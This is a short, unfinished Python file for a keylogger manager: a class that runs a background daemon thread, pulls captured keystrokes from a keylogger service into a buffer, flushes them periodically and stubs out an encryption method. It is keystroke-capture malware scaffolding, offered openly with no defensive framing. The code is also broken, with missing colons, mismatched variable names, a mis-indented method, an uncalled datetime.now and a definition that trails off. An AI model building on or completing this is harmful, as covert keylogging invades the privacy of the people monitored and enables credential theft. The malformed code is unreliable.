import threading
import time
from datetime import datetime
import KeyloggerServise
class KeyLoggerManager:
    def __init__(self,KeyloggerServise,fileWriter , time = 5)
        self.KeyloggerServise = KeyloggerServise
        self.fileWriter = file_writer
        self.time = time 
        self.buffer = []
        self.running = False
        self.thread = None
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
     def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        self._flush_buffer()

    def _run(self):
        while self.running:
            new_keys = self.keyloggerServise.get_keys()
            self.buffer.extend(new_keys)
            if self.buffer:
                self._flush_buffer()
            time.sleep(self.time) 
    def _flush_buffer(self):
        if not self.buffer
            return 
        timestamp = datetime.now                  
    def encryption(self)
